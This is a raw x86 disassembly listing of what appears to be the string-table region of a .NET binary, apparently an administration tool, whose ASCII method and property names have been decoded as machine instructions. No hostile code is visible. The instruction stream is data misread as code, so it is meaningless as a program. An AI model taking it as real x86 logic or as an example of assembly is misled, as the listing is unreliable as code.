  4097a9:	jb     0x409810
  4097ab:	add    BYTE PTR [edi+0x65],ah
  4097ae:	je     0x40980f
  4097b0:	push   edx
  4097b1:	gs jae 0x409823
  4097b4:	jne    0x409828
  4097b6:	arpl   WORD PTR [ebp+0x4d],sp
  4097b9:	popa   
  4097ba:	outs   dx,BYTE PTR ds:[esi]
  4097bb:	popa   
  4097bc:	addr16 gs jb 0x4097c0
  4097c0:	addr16 gs je 0x409823
  4097c4:	inc    ebx
  4097c5:	jne    0x409833
  4097c7:	je     0x40983e
  4097c9:	jb     0x409830
  4097cb:	add    BYTE PTR [ebx+0x65],dh
  4097ce:	je     0x40982f
  4097d0:	inc    ebx
  4097d1:	jne    0x40983f
  4097d3:	je     0x40984a
  4097d5:	jb     0x40983c
  4097d7:	add    BYTE PTR [edi+0x65],ah
  4097da:	je     0x40983b
  4097dc:	inc    ecx
  4097dd:	inc    ebx
  4097de:	dec    esp
  4097df:	dec    edi
  4097e0:	outs   dx,BYTE PTR ds:[esi]
  4097e1:	dec    edi
  4097e2:	bound  ebp,QWORD PTR [edx+0x65]
  4097e5:	arpl   WORD PTR [eax+eax*1+0x67],si
  4097e9:	gs je  0x40984b
  4097ec:	inc    ecx
  4097ed:	fs imul ebp,DWORD PTR fs:[esi+0x67],0x65636341
  4097f6:	jae    0x40986b
  4097f8:	inc    ebx
  4097f9:	outs   dx,DWORD PTR ds:[esi]
  4097fa:	outs   dx,BYTE PTR ds:[esi]
  4097fb:	je     0x40986f
  4097fd:	outs   dx,DWORD PTR ds:[esi]
  4097fe:	ins    BYTE PTR es:[edi],dx
  4097ff:	inc    ebp
  409800:	outs   dx,BYTE PTR ds:[esi]
  409801:	je     0x409875
  409803:	jns    0x409805
  409805:	addr16 gs je 0x409868
  409809:	inc    ecx
  40980a:	fs imul ebp,DWORD PTR fs:[esi+0x67],0x626d654d
  409813:	gs jb  0x40986a
  409816:	outs   dx,DWORD PTR ds:[esi]
  409817:	inc    edi
  409818:	jb     0x409889
  40981a:	jne    0x40988c
  40981c:	add    BYTE PTR [edi+0x65],ah
  40981f:	je     0x409880
  409821:	inc    ecx
  409822:	dec    ebp
  409823:	gs ins DWORD PTR es:[edi],dx
  409825:	bound  esp,QWORD PTR [ebp+0x72]
  409828:	dec    edi
  409829:	data16 add BYTE PTR [edi+0x65],ah
  40982d:	je     0x40988e
  40982f:	inc    ebx
  409830:	popa   
  409831:	jo     0x40989c
  409833:	je     0x409896
  409835:	ins    BYTE PTR es:[edi],dx
  409836:	push   esp
  409837:	inc    esi
  409838:	push   ebx
  409839:	inc    ecx
  40983a:	jo     0x4098ac
  40983c:	ins    BYTE PTR es:[edi],dx
  40983d:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  409844:	inc    edi
  409845:	jb     0x4098b6
  409847:	jne    0x4098b9
  409849:	add    BYTE PTR [edi+0x65],ah
  40984c:	je     0x4098ad
  40984e:	inc    ebx
  40984f:	push   0x69676e61
  409854:	outs   dx,BYTE PTR ds:[esi]
  409855:	addr16 inc ecx
  409857:	jo     0x4098c9
  409859:	ins    BYTE PTR es:[edi],dx
  40985a:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  409861:	inc    edi
  409862:	jb     0x4098d3
  409864:	jne    0x4098d6
  409866:	inc    esp
  409867:	gs jae 0x4098cd
  40986a:	jb     0x4098d5
  40986c:	jo     0x4098e2
  40986e:	imul   ebp,DWORD PTR [edi+0x6e],0x74656700
  409875:	pop    edi
  409876:	inc    ebx
  409877:	push   0x696b6365
  40987c:	outs   dx,BYTE PTR ds:[esi]
  40987d:	addr16 inc edi
  40987f:	jb     0x4098f0
  409881:	jne    0x4098f3
  409883:	dec    ebp
  409884:	gs ins DWORD PTR es:[edi],dx
  409886:	bound  esp,QWORD PTR [ebp+0x72]
  409889:	jae    0x4098f3
  40988b:	imul   esi,DWORD PTR [eax+0x0],0x5f746567
  409892:	inc    ebx
  409893:	outs   dx,DWORD PTR ds:[esi]
  409894:	jo     0x40990f
  409896:	jb     0x409901
  409898:	addr16 push 0x61745374
  40989e:	je     0x409905
  4098a0:	ins    DWORD PTR es:[edi],dx
  4098a1:	outs   dx,BYTE PTR gs:[esi]
  4098a3:	je     0x4098a5
  4098a5:	addr16 gs je 0x409908
  4098a9:	inc    ebx
  4098aa:	jb     0x409911
  4098ac:	popa   
  4098ad:	je     0x409918
  4098af:	outs   dx,BYTE PTR ds:[esi]
  4098b0:	addr16 inc edi
  4098b2:	ins    BYTE PTR es:[edi],dx
  4098b3:	outs   dx,DWORD PTR ds:[esi]
  4098b4:	bound  esp,QWORD PTR [ecx+0x6c]
  4098b7:	inc    ecx
  4098b8:	jo     0x40992a
  4098ba:	ins    BYTE PTR es:[edi],dx
  4098bb:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  4098c2:	inc    edi
  4098c3:	jb     0x409934
  4098c5:	jne    0x409937
  4098c7:	add    BYTE PTR [edi+0x65],ah
  4098ca:	je     0x40992b
  4098cc:	inc    ebx
  4098cd:	jb     0x409934
  4098cf:	popa   
  4098d0:	je     0x40993b
  4098d2:	outs   dx,BYTE PTR ds:[esi]
  4098d3:	addr16 dec esp
  4098d5:	outs   dx,DWORD PTR ds:[esi]
  4098d6:	arpl   WORD PTR [ecx+0x6c],sp
  4098d9:	inc    ecx
  4098da:	jo     0x40994c
  4098dc:	ins    BYTE PTR es:[edi],dx
  4098dd:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  4098e4:	inc    edi
  4098e5:	jb     0x409956
  4098e7:	jne    0x409959
  4098e9:	add    BYTE PTR [edi+0x65],ah
  4098ec:	je     0x40994d
  4098ee:	inc    esp
  4098ef:	gs ins BYTE PTR es:[edi],dx
  4098f1:	gs je  0x40995d
  4098f4:	outs   dx,BYTE PTR ds:[esi]
  4098f5:	addr16 inc ecx
  4098f7:	jo     0x409969
  4098f9:	ins    BYTE PTR es:[edi],dx
  4098fa:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  409901:	inc    edi
  409902:	jb     0x409973
  409904:	jne    0x409976
  409906:	add    BYTE PTR [edi+0x65],ah
  409909:	je     0x40996a
  40990b:	inc    esp
  40990c:	gs jae 0x409972
  40990f:	jb     0x40997a
  409911:	jo     0x409987
  409913:	imul   ebp,DWORD PTR [edi+0x6e],0x74656700
  40991a:	pop    edi
  40991b:	inc    esp
  40991c:	imul   esi,DWORD PTR [ebx+0x70],0x4e79616c
  409923:	popa   
  409924:	ins    DWORD PTR es:[edi],dx
  409925:	add    BYTE PTR gs:[edi+0x65],ah
  409929:	je     0x40998a
  40992b:	inc    esp
  40992c:	outs   dx,DWORD PTR ds:[esi]
  40992d:	outs   dx,BYTE PTR ds:[esi]
  40992e:	add    BYTE PTR gs:[edi+0x65],ah
  409932:	je     0x409993
  409934:	inc    ebp
  409935:	ins    DWORD PTR es:[edi],dx
  409936:	jo     0x4099ac
  409938:	jns    0x40997d
  40993a:	outs   dx,DWORD PTR ds:[esi]
  40993b:	ins    DWORD PTR es:[edi],dx
  40993c:	ins    DWORD PTR es:[edi],dx
  40993d:	popa   
  40993e:	outs   dx,BYTE PTR ds:[esi]
  40993f:	fs push eax
  409941:	popa   
  409942:	jb     0x4099a5
  409944:	ins    DWORD PTR es:[edi],dx
  409945:	gs je  0x4099ad
  409948:	jb     0x40994a
  40994a:	addr16 gs je 0x4099ad
  40994e:	inc    ebp
  40994f:	ins    DWORD PTR es:[edi],dx
  409950:	jo     0x4099c6
  409952:	jns    0x409997
  409954:	outs   dx,DWORD PTR ds:[esi]
  409955:	ins    DWORD PTR es:[edi],dx
  409956:	ins    DWORD PTR es:[edi],dx
  409957:	popa   
  409958:	outs   dx,BYTE PTR ds:[esi]
  409959:	fs push ebx
  40995b:	ja     0x4099c6
  40995d:	je     0x4099c2
  40995f:	push   0x6f6e6749
  409964:	jb     0x4099cb
  409966:	add    BYTE PTR fs:[edi+0x65],ah
  40996a:	je     0x4099cb
  40996c:	inc    ebp
  40996d:	ins    DWORD PTR es:[edi],dx
  40996e:	jo     0x4099e4
  409970:	jns    0x4099b5
  409972:	outs   dx,DWORD PTR ds:[esi]
  409973:	ins    DWORD PTR es:[edi],dx
  409974:	ins    DWORD PTR es:[edi],dx
  409975:	popa   
  409976:	outs   dx,BYTE PTR ds:[esi]
  409977:	fs push ebx
  409979:	ja     0x4099e4
  40997b:	je     0x4099e0
  40997d:	push   0x68746957
  409982:	inc    esp
  409983:	outs   dx,DWORD PTR ds:[esi]
  409984:	ins    DWORD PTR es:[edi],dx
  409985:	popa   
  409986:	imul   ebp,DWORD PTR [esi+0x49],0x726f6e67
  40998d:	gs add BYTE PTR fs:[edi+0x65],ah
  409992:	je     0x4099f3
  409994:	inc    ebp
  409995:	ins    DWORD PTR es:[edi],dx
  409996:	jo     0x409a0c
  409998:	jns    0x4099ed
  40999a:	ja     0x409a05
  40999c:	je     0x409a01
  40999e:	push   0x67007365
  4099a3:	gs je  0x409a05
  4099a6:	inc    ebp
  4099a7:	jb     0x409a1b
  4099a9:	outs   dx,DWORD PTR ds:[esi]
  4099aa:	jb     0x4099ac
  4099ac:	addr16 gs je 0x409a0f
  4099b0:	inc    edi
  4099b1:	ins    BYTE PTR es:[edi],dx
  4099b2:	outs   dx,DWORD PTR ds:[esi]
  4099b3:	bound  esp,QWORD PTR [ecx+0x6c]
  4099b6:	add    BYTE PTR [edi+0x65],ah
  4099b9:	je     0x409a1a
  4099bb:	inc    edi
  4099bc:	jb     0x409a2d
  4099be:	jne    0x409a30
  4099c0:	push   esp
  4099c1:	jns    0x409a33
  4099c3:	add    BYTE PTR gs:[edi+0x65],ah
  4099c7:	je     0x409a28
  4099c9:	dec    eax
  4099ca:	gs ins BYTE PTR es:[edi],dx
  4099cc:	jo     0x409a11
  4099ce:	outs   dx,DWORD PTR ds:[esi]
  4099cf:	ins    DWORD PTR es:[edi],dx
  4099d0:	ins    DWORD PTR es:[edi],dx
  4099d1:	popa   
  4099d2:	outs   dx,BYTE PTR ds:[esi]
  4099d3:	fs jae 0x4099d6
  4099d6:	addr16 gs je 0x409a39
  4099da:	dec    eax
  4099db:	gs ins BYTE PTR es:[edi],dx
  4099dd:	jo     0x409a23
  4099df:	outs   dx,DWORD PTR ds:[esi]
  4099e0:	ins    DWORD PTR es:[edi],dx
  4099e1:	popa   
  4099e2:	imul   ebp,DWORD PTR [esi+0x0],0x5f746567
  4099e9:	dec    eax
  4099ea:	gs ins BYTE PTR es:[edi],dx
  4099ec:	jo     0x409a37
  4099ee:	fs outs dx,BYTE PTR gs:[esi]
  4099f1:	je     0x409a5c
  4099f3:	je     0x409a6e
  4099f5:	add    BYTE PTR [edi+0x65],ah
  4099f8:	je     0x409a59
  4099fa:	dec    eax
  4099fb:	gs ins BYTE PTR es:[edi],dx
  4099fd:	jo     0x409a52
  4099ff:	arpl   WORD PTR gs:[ebp+0x72],si
  409a03:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x5f746567
  409a0b:	dec    eax
  409a0c:	gs ins BYTE PTR es:[edi],dx
  409a0e:	jo     0x409a64
  409a10:	jns    0x409a82
  409a12:	gs jae 0x409a15
  409a15:	addr16 gs je 0x409a78
  409a19:	dec    ecx
  409a1a:	fs outs dx,BYTE PTR gs:[esi]
  409a1d:	je     0x409a88
  409a1f:	je     0x409a9a
  409a21:	inc    ebx
  409a22:	popa   
  409a23:	outs   dx,BYTE PTR ds:[esi]
  409a24:	outs   dx,BYTE PTR ds:[esi]
  409a25:	outs   dx,DWORD PTR ds:[esi]
  409a26:	je     0x409a6a
  409a28:	gs push edx
  409a2a:	gs jae 0x409a9c
  409a2d:	ins    BYTE PTR es:[edi],dx
  409a2e:	jbe    0x409a95
  409a30:	add    BYTE PTR fs:[edi+0x65],ah
  409a34:	je     0x409a95
  409a36:	dec    ecx
  409a37:	fs outs dx,BYTE PTR gs:[esi]
  409a3a:	je     0x409aa5
  409a3c:	je     0x409ab7
  409a3e:	push   esp
  409a3f:	jns    0x409ab1
  409a41:	add    BYTE PTR gs:[edi+0x65],ah
  409a45:	je     0x409aa6
  409a47:	dec    ecx
  409a48:	outs   dx,BYTE PTR ds:[esi]
  409a49:	jae    0x409ac0
  409a4b:	data16 imul sp,WORD PTR [ebx+0x69],0x6e65
  409a52:	je     0x409aa2
  409a54:	jne    0x409ac3
  409a56:	bound  esp,QWORD PTR [ebp+0x72]
  409a59:	dec    edi
  409a5a:	push   ax
  409a5c:	popa   
  409a5d:	jb     0x409ac0
  409a5f:	ins    DWORD PTR es:[edi],dx
  409a60:	gs je  0x409ac8
  409a63:	jb     0x409ad8
  409a65:	add    BYTE PTR [edi+0x65],ah
  409a68:	je     0x409ac9
  409a6a:	dec    ecx
  409a6b:	outs   dx,BYTE PTR ds:[esi]
  409a6c:	jbe    0x409acf
  409a6e:	ins    BYTE PTR es:[edi],dx
  409a6f:	imul   esp,DWORD PTR [eax+eax*1+0x67],0x495f7465
  409a77:	outs   dx,BYTE PTR ds:[esi]
  409a78:	jbe    0x409adb
  409a7a:	ins    BYTE PTR es:[edi],dx
  409a7b:	imul   esp,DWORD PTR [ecx+eax*2+0x63],0x73736563
  409a83:	inc    ebx
  409a84:	outs   dx,DWORD PTR ds:[esi]
  409a85:	outs   dx,BYTE PTR ds:[esi]
  409a86:	je     0x409afa
  409a88:	outs   dx,DWORD PTR ds:[esi]
  409a89:	ins    BYTE PTR es:[edi],dx
  409a8a:	inc    ebp
  409a8b:	js     0x409af0
  409a8d:	gs jo  0x409b04
  409a90:	imul   ebp,DWORD PTR [edi+0x6e],0x74656700
  409a97:	pop    edi
  409a98:	dec    ecx
  409a99:	outs   dx,BYTE PTR ds:[esi]
  409a9a:	jbe    0x409afd
  409a9c:	ins    BYTE PTR es:[edi],dx
  409a9d:	imul   esp,DWORD PTR [ecx+eax*2+0x63],0x6e6f6974
  409aa5:	add    BYTE PTR [edi+0x65],ah
  409aa8:	je     0x409b09
  409aaa:	dec    ecx
  409aab:	outs   dx,BYTE PTR ds:[esi]
  409aac:	jbe    0x409b0f
  409aae:	ins    BYTE PTR es:[edi],dx
  409aaf:	imul   esp,DWORD PTR [ebx+eax*2+0x6f],0x6e616d6d
  409ab7:	fs push ebx
  409ab9:	ja     0x409b24
  409abb:	je     0x409b20
  409abd:	push   0x6f6e6749
  409ac2:	jb     0x409b29
  409ac4:	add    BYTE PTR fs:[edi+0x65],ah
  409ac8:	je     0x409b29
  409aca:	dec    ecx
  409acb:	outs   dx,BYTE PTR ds:[esi]
  409acc:	jbe    0x409b2f
  409ace:	ins    BYTE PTR es:[edi],dx
  409acf:	imul   esp,DWORD PTR [esi+ecx*2+0x6f],0x76726553
  409ad7:	gs jb  0x409ada
  409ada:	addr16 gs je 0x409b3d
  409ade:	dec    ecx
  409adf:	outs   dx,BYTE PTR ds:[esi]
  409ae0:	jbe    0x409b43
  409ae2:	ins    BYTE PTR es:[edi],dx
  409ae3:	imul   esp,DWORD PTR [edx+edx*2+0x65],0x6e727574
  409aeb:	gs fs dec ecx
  409aee:	fs outs dx,BYTE PTR gs:[esi]
  409af1:	je     0x409b5c
  409af3:	je     0x409b6e
  409af5:	add    BYTE PTR [edi+0x65],ah
  409af8:	je     0x409b59
  409afa:	dec    ecx
  409afb:	outs   dx,BYTE PTR ds:[esi]
  409afc:	jbe    0x409b5f
  409afe:	ins    BYTE PTR es:[edi],dx
  409aff:	imul   esp,DWORD PTR [ebx+edx*2+0x77],0x68637469
  409b07:	gs jae 0x409b53
  409b0a:	outs   dx,BYTE PTR ds:[si]
  409b0c:	outs   dx,DWORD PTR ds:[esi]
  409b0d:	jb     0x409b74
  409b0f:	add    BYTE PTR fs:[edi+0x65],ah
  409b13:	je     0x409b74
  409b15:	dec    ecx
  409b16:	jae    0x409b18
  409b18:	addr16 gs je 0x409b7b
  409b1c:	dec    ecx
  409b1d:	jae    0x409b6d
  409b1f:	outs   dx,DWORD PTR ds:[esi]
  409b20:	je     0x409b22
  409b22:	addr16 gs je 0x409b85
  409b26:	dec    esp
  409b27:	gs addr16 popa 
  409b2a:	ins    BYTE PTR es:[edi],dx
  409b2b:	push   ebx
  409b2c:	je     0x409b8f
  409b2e:	je     0x409b95
  409b30:	ins    DWORD PTR es:[edi],dx
  409b31:	outs   dx,BYTE PTR gs:[esi]
  409b33:	je     0x409b35
  409b35:	addr16 gs je 0x409b98
  409b39:	dec    esp
  409b3a:	outs   dx,DWORD PTR ds:[esi]
  409b3b:	outs   dx,DWORD PTR ds:[si]
  409b3d:	outs   dx,BYTE PTR ds:[esi]
  409b3e:	dec    esi
  409b3f:	popa   
  409b40:	ins    DWORD PTR es:[edi],dx
  409b41:	add    BYTE PTR gs:[edi+0x65],ah
  409b45:	je     0x409ba6
  409b47:	dec    ebp
  409b48:	popa   
  409b49:	imul   ebp,DWORD PTR [ecx+eax*2+0x64],0x73657264
  409b51:	jae    0x409b53
  409b53:	addr16 gs je 0x409bb6
  409b57:	dec    ebp
  409b58:	gs ins DWORD PTR es:[edi],dx
  409b5a:	bound  esp,QWORD PTR [ebp+0x72]
  409b5d:	dec    edi
  409b5e:	data16 add BYTE PTR [edi+0x65],ah
  409b62:	je     0x409bc3
  409b64:	dec    ebp
  409b65:	gs ins DWORD PTR es:[edi],dx
  409b67:	bound  esp,QWORD PTR [ebp+0x72]
  409b6a:	jae    0x409b6c
  409b6c:	addr16 gs je 0x409bcf
  409b70:	dec    esi
  409b71:	outs   dx,DWORD PTR ds:[esi]
  409b72:	inc    ebx
  409b73:	outs   dx,DWORD PTR ds:[esi]
  409b74:	ins    DWORD PTR es:[edi],dx
  409b75:	ins    DWORD PTR es:[edi],dx
  409b76:	popa   
  409b77:	outs   dx,BYTE PTR ds:[esi]
  409b78:	fs push esp
  409b7a:	outs   dx,DWORD PTR ds:[esi]
  409b7b:	inc    ebp
  409b7c:	js     0x409be3
  409b7e:	arpl   WORD PTR [ebp+0x74],si
  409b81:	add    BYTE PTR gs:[edi+0x65],ah
  409b85:	je     0x409be6
  409b87:	dec    esi
  409b88:	outs   dx,DWORD PTR ds:[esi]
  409b89:	je     0x409bcc
  409b8b:	jo     0x409bfd
  409b8d:	ins    BYTE PTR es:[edi],dx
  409b8e:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  409b95:	inc    edi
  409b96:	jb     0x409c07
  409b98:	jne    0x409c0a
  409b9a:	add    BYTE PTR [edi+0x65],ah
  409b9d:	je     0x409bfe
  409b9f:	dec    esi
  409ba0:	jne    0x409c0e
  409ba2:	ins    BYTE PTR es:[edi],dx
  409ba3:	dec    ecx
  409ba4:	fs outs dx,BYTE PTR gs:[esi]
  409ba7:	je     0x409c12
  409ba9:	je     0x409c24
  409bab:	add    BYTE PTR [edi+0x65],ah
  409bae:	je     0x409c0f
  409bb0:	push   eax
  409bb1:	jb     0x409c22
  409bb3:	push   0x65
  409bb5:	arpl   WORD PTR [ebx+edx*2+0x63],si
  409bb9:	outs   dx,DWORD PTR ds:[esi]
  409bba:	jo     0x409c21
  409bbc:	add    BYTE PTR [edi+0x65],ah
  409bbf:	je     0x409c20
  409bc1:	push   ecx
  409bc2:	inc    ecx
  409bc3:	inc    ecx
  409bc4:	jne    0x409c3a
  409bc6:	outs   dx,DWORD PTR ds:[esi]
  409bc7:	ins    DWORD PTR es:[edi],dx
  409bc8:	popa   
  409bc9:	je     0x409c34
  409bcb:	outs   dx,DWORD PTR ds:[esi]
  409bcc:	outs   dx,BYTE PTR ds:[esi]
  409bcd:	dec    ebp
  409bce:	outs   dx,DWORD PTR ds:[esi]
  409bcf:	fs gs ins BYTE PTR es:[edi],dx
  409bd2:	inc    ebp
  409bd3:	outs   dx,BYTE PTR ds:[esi]
  409bd4:	popa   
  409bd5:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  409bd9:	add    BYTE PTR [edi+0x65],ah
  409bdc:	je     0x409c3d
  409bde:	push   edx
  409bdf:	gs ins DWORD PTR es:[edi],dx
  409be1:	outs   dx,DWORD PTR ds:[esi]
  409be2:	jbe    0x409c4d
  409be4:	outs   dx,BYTE PTR ds:[esi]
  409be5:	addr16 inc ecx
  409be7:	arpl   WORD PTR [ebx+0x65],sp
  409bea:	jae    0x409c5f
  409bec:	inc    ebx
  409bed:	outs   dx,DWORD PTR ds:[esi]
  409bee:	outs   dx,BYTE PTR ds:[esi]
  409bef:	je     0x409c63
  409bf1:	outs   dx,DWORD PTR ds:[esi]
  409bf2:	ins    BYTE PTR es:[edi],dx
  409bf3:	inc    ebp
  409bf4:	outs   dx,BYTE PTR ds:[esi]
  409bf5:	je     0x409c69
  409bf7:	jns    0x409bf9
  409bf9:	addr16 gs je 0x409c5c
  409bfd:	push   edx
  409bfe:	gs ins DWORD PTR es:[edi],dx
  409c00:	outs   dx,DWORD PTR ds:[esi]
  409c01:	jbe    0x409c6c
  409c03:	outs   dx,BYTE PTR ds:[esi]
  409c04:	addr16 dec ebp
  409c06:	gs ins DWORD PTR es:[edi],dx
  409c08:	bound  esp,QWORD PTR [ebp+0x72]
  409c0b:	inc    esi
  409c0c:	jb     0x409c7d
  409c0e:	ins    DWORD PTR es:[edi],dx
  409c0f:	inc    edi
  409c10:	jb     0x409c81
  409c12:	jne    0x409c84
  409c14:	add    BYTE PTR [edi+0x65],ah
  409c17:	je     0x409c78
  409c19:	push   edx
  409c1a:	outs   dx,BYTE PTR gs:[esi]
  409c1c:	popa   
  409c1d:	ins    DWORD PTR es:[edi],dx
  409c1e:	imul   ebp,DWORD PTR [esi+0x67],0x6c707041
  409c25:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  409c2c:	inc    edi
  409c2d:	jb     0x409c9e
  409c2f:	jne    0x409ca1
  409c31:	add    BYTE PTR [edi+0x65],ah
  409c34:	je     0x409c95
  409c36:	push   edx
  409c37:	gs jae 0x409ca9
  409c3a:	ins    BYTE PTR es:[edi],dx
  409c3b:	jbe    0x409ca6
  409c3d:	outs   dx,BYTE PTR ds:[esi]
  409c3e:	addr16 dec ecx
  409c40:	fs outs dx,BYTE PTR gs:[esi]
  409c43:	je     0x409cae
  409c45:	je     0x409cc0
  409c47:	add    BYTE PTR [edi+0x65],ah
  409c4a:	je     0x409cab
  409c4c:	push   edx
  409c4d:	gs je  0x409cc2
  409c50:	imul   esp,DWORD PTR [ebp+0x76],0x41676e69
  409c57:	arpl   WORD PTR [ebx+0x65],sp
  409c5a:	jae    0x409ccf
  409c5c:	inc    ebx
  409c5d:	outs   dx,DWORD PTR ds:[esi]
  409c5e:	outs   dx,BYTE PTR ds:[esi]
  409c5f:	je     0x409cd3
  409c61:	outs   dx,DWORD PTR ds:[esi]
  409c62:	ins    BYTE PTR es:[edi],dx
  409c63:	dec    esp
  409c64:	imul   esi,DWORD PTR [ebx+0x74],0x74656700
  409c6b:	pop    edi
  409c6c:	push   edx
  409c6d:	gs je  0x409ce2
  409c70:	imul   esp,DWORD PTR [ebp+0x76],0x41676e69
  409c77:	jo     0x409ce9
  409c79:	ins    BYTE PTR es:[edi],dx
  409c7a:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  409c81:	inc    edi
  409c82:	jb     0x409cf3
  409c84:	jne    0x409cf6
  409c86:	jae    0x409c88
  409c88:	addr16 gs je 0x409ceb
  409c8c:	push   ebx
  409c8d:	arpl   WORD PTR gs:[ebp+0x72],si
  409c91:	imul   esi,DWORD PTR [ecx+edi*2+0x4e],0x73656d61
  409c99:	jo     0x409cfc
  409c9b:	arpl   WORD PTR [ebp+0x44],sp
  409c9e:	outs   dx,DWORD PTR ds:[esi]
  409c9f:	gs jae 0x409cf0
  409ca2:	outs   dx,DWORD PTR ds:[esi]
  409ca3:	je     0x409cea
  409ca5:	js     0x409d10
  409ca7:	jae    0x409d1d
  409ca9:	add    BYTE PTR [edi+0x65],ah
  409cac:	je     0x409d0d
  409cae:	push   ebx
  409caf:	push   0x6341776f
  409cb4:	je     0x409d1f
  409cb6:	outs   dx,DWORD PTR ds:[esi]
  409cb7:	outs   dx,BYTE PTR ds:[esi]
  409cb8:	jae    0x409cba
  409cba:	addr16 gs je 0x409d1d
  409cbe:	push   ebx
  409cbf:	push   0x614e776f
  409cc4:	ins    DWORD PTR es:[edi],dx
  409cc5:	gs jae 0x409d38
  409cc8:	popa   
  409cc9:	arpl   WORD PTR [ebp+0x73],sp
  409ccc:	add    BYTE PTR [edi+0x65],ah
  409ccf:	je     0x409d30
  409cd1:	push   ebx
  409cd2:	jne    0x409d44
  409cd4:	gs jb  0x409d3d
  409cd7:	ins    BYTE PTR es:[edi],dx
  409cd8:	jne    0x409d49
  409cda:	jne    0x409d4f
  409cdc:	inc    ebx
  409cdd:	outs   dx,DWORD PTR ds:[esi]
  409cde:	ins    DWORD PTR es:[edi],dx
  409cdf:	ins    DWORD PTR es:[edi],dx
  409ce0:	popa   
  409ce1:	outs   dx,BYTE PTR ds:[esi]
  409ce2:	fs push eax
  409ce4:	popa   
  409ce5:	jb     0x409d48
  409ce7:	ins    DWORD PTR es:[edi],dx
  409ce8:	gs je  0x409d50
  409ceb:	jb     0x409d36
  409ced:	outs   dx,BYTE PTR ds:[si]
  409cef:	outs   dx,DWORD PTR ds:[esi]
  409cf0:	jb     0x409d57
  409cf2:	add    BYTE PTR fs:[edi+0x65],ah
  409cf6:	je     0x409d57
  409cf8:	push   ebx
  409cf9:	jne    0x409d6b
  409cfb:	gs jb  0x409d64
  409cfe:	ins    BYTE PTR es:[edi],dx
  409cff:	jne    0x409d70
  409d01:	jne    0x409d76
  409d03:	inc    ebx
  409d04:	outs   dx,DWORD PTR ds:[esi]
  409d05:	ins    DWORD PTR es:[edi],dx
  409d06:	ins    DWORD PTR es:[edi],dx
  409d07:	popa   
  409d08:	outs   dx,BYTE PTR ds:[esi]
  409d09:	fs push eax
  409d0b:	popa   
  409d0c:	jb     0x409d6f
  409d0e:	ins    DWORD PTR es:[edi],dx
  409d0f:	gs je  0x409d77
  409d12:	jb     0x409d87
  409d14:	dec    ecx
  409d15:	outs   dx,BYTE PTR ds:[si]
  409d17:	outs   dx,DWORD PTR ds:[esi]
  409d18:	jb     0x409d7f
  409d1a:	add    BYTE PTR fs:[edi+0x65],ah
  409d1e:	je     0x409d7f
  409d20:	push   ebx
  409d21:	jne    0x409d93
  409d23:	gs jb  0x409d8c
  409d26:	ins    BYTE PTR es:[edi],dx
  409d27:	jne    0x409d98
  409d29:	jne    0x409d9e
  409d2b:	inc    ebx
  409d2c:	outs   dx,DWORD PTR ds:[esi]
  409d2d:	ins    DWORD PTR es:[edi],dx
  409d2e:	ins    DWORD PTR es:[edi],dx
  409d2f:	popa   
  409d30:	outs   dx,BYTE PTR ds:[esi]
  409d31:	fs push ebx
  409d33:	ja     0x409d9e
  409d35:	je     0x409d9a
  409d37:	push   0x6f6e6749
  409d3c:	jb     0x409da3
  409d3e:	add    BYTE PTR fs:[edi+0x65],ah
  409d42:	je     0x409da3
  409d44:	push   ebx
  409d45:	jne    0x409db7
  409d47:	gs jb  0x409db0
  409d4a:	ins    BYTE PTR es:[edi],dx
  409d4b:	jne    0x409dbc
  409d4d:	jne    0x409dc2
  409d4f:	inc    ebx
  409d50:	outs   dx,DWORD PTR ds:[esi]
  409d51:	ins    DWORD PTR es:[edi],dx
  409d52:	ins    DWORD PTR es:[edi],dx
  409d53:	popa   
  409d54:	outs   dx,BYTE PTR ds:[esi]
  409d55:	fs push ebx
  409d57:	ja     0x409dc2
  409d59:	je     0x409dbe
  409d5b:	push   0x6f6e6749
  409d60:	jb     0x409dc7
  409d62:	fs push edi
  409d64:	imul   esi,DWORD PTR [eax+ebp*2+0x44],0x69616d6f
  409d6c:	outs   dx,BYTE PTR ds:[esi]
  409d6d:	add    BYTE PTR [edi+0x65],ah
  409d70:	je     0x409dd1
  409d72:	push   ebx
  409d73:	jne    0x409de5
  409d75:	gs jb  0x409dde
  409d78:	ins    BYTE PTR es:[edi],dx
  409d79:	jne    0x409dea
  409d7b:	jne    0x409df0
  409d7d:	push   ebx
  409d7e:	ja     0x409de9
  409d80:	je     0x409de5
  409d82:	push   0x6f6e6749
  409d87:	jb     0x409dee
  409d89:	add    BYTE PTR fs:[edi+0x65],ah
  409d8d:	je     0x409dee
  409d8f:	push   esp
  409d90:	popa   
  409d91:	jb     0x409dfa
  409d93:	gs je  0x409dea
  409d96:	inc    esi
  409d97:	push   ebx
  409d98:	inc    esp
  409d99:	outs   dx,DWORD PTR ds:[esi]
  409d9a:	ins    DWORD PTR es:[edi],dx
  409d9b:	popa   
  409d9c:	imul   ebp,DWORD PTR [esi+0x0],0x5f746567
  409da3:	push   ebp
  409da4:	outs   dx,BYTE PTR ds:[esi]
  409da5:	imul   ebp,DWORD PTR [esi+0x6f],0x77
  409da9:	outs   dx,BYTE PTR ds:[esi]
  409daa:	add    BYTE PTR [edi+0x65],ah
  409dad:	je     0x409e0e
  409daf:	push   ebp
  409db0:	jae    0x409e1b
  409db2:	outs   dx,BYTE PTR ds:[esi]
  409db3:	addr16 inc ecx
  409db5:	jne    0x409e2b
  409db7:	push   0x7a69726f
  409dbc:	popa   
  409dbd:	je     0x409e28
  409dbf:	outs   dx,DWORD PTR ds:[esi]
  409dc0:	outs   dx,BYTE PTR ds:[esi]
  409dc1:	inc    edx
  409dc2:	arpl   WORD PTR gs:[ecx+0x75],sp
  409dc6:	jae    0x409e2d
  409dc8:	dec    edi
  409dc9:	inc    si
  409dcb:	outs   dx,DWORD PTR ds:[esi]
  409dcc:	jb     0x409e3b
  409dce:	popa   
  409dcf:	je     0x409dd1
  409dd1:	addr16 gs je 0x409e34
  409dd5:	push   esi
  409dd6:	gs jb  0x409e42
  409dd9:	data16 jns 0x409e45
